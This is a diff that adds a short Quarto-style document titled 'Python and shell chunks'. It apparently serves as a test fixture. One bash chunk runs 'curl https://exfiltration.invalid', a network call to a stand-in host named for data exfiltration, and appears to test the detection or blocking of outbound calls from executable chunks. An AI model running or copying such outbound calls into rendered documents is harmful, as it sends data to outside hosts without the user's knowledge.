@@ -1,0 +1,11 @@
+---
+title: "Python and shell chunks"
+---
+
+```{python}
+import os
+```
+
+```{bash}
+curl https://exfiltration.invalid
+```
